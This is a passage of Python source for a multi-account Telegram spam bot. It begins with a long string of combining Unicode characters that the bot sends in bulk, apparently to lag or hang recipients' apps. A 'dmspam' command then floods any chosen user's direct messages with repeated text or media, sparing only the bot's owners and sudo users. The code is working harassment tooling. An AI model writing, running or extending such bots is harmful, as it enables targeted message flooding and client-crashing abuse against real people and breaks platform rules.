꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰😈꙰꙰꙰꙰꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰😈꙰꙰꙰꙰꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰😈꙰꙰꙰꙰꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰😈꙰꙰꙰꙰꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟"
                await asyncio.wait([e.respond(hang, reply_to=e.reply_to_msg_id) for i in range(counter)])
        else:
            await e.reply(usage)

# dm cmds

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sdmspam(?: |$)(.*)" % hl))
async def dmspam(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **DM Spam**\n\nCommand:\n\n{hl}dmspam <count> <username> <message to spam>\n\n{hl}dmspam <count> <username> <reply to a message>\n\nCount must be a integer."
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 2)
        Rizoelsexy = rizoel[1:]
        smex = await e.get_reply_message()
        if len(Rizoelsexy) == 2:
            user = str(Rizoelsexy[0])
            a = await e.client.get_entity(user)
            g = a.id
            if int(g) in RiZoeLX:
                text = f"I can't Dm To @RiZoeLX's Owner"
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                message = str(Rizoelsexy[1])
                counter = int(rizoel[0])
                await e.reply("☢️ Dm Spam Started ☢️")
                for _ in range(counter):
                     await e.client.send_message(g, message)
                     await asyncio.sleep(0.3)
        elif e.reply_to_msg_id and smex.media:
            user = str(Rizoelsexy[0])
            a = await e.client.get_entity(user)
            g = a.id
            if int(g) in RiZoeLX:
                text = f"I can't Dm To @RiZoeLX's Owner"
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:           
                 counter = int(rizoel[0])
                 await e.reply("☢️ Dm Spam Started ☢️")
                 for _ in range(counter):
                     smex = await e.client.send_file(g, smex, caption=smex.text)
                     await gifspam(e, smex) 
                     await asyncio.sleep(0.4)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            user = str(Rizoelsexy[0])
            a = await e.client.get_entity(user)
            g = a.id
            if int(g) in RiZoeLX:
                text = f"I can't Dm To @RiZoeLX's Owner"
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                counter = int(rizoel[0])
                await e.reply("☢️ Dm Spam Started ☢️")
                for _ in range(counter):
                    await e.client.send_message(g, message)
                    await asyncio.sleep(0.3)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sdm(?: |$)(.*)" % hl))
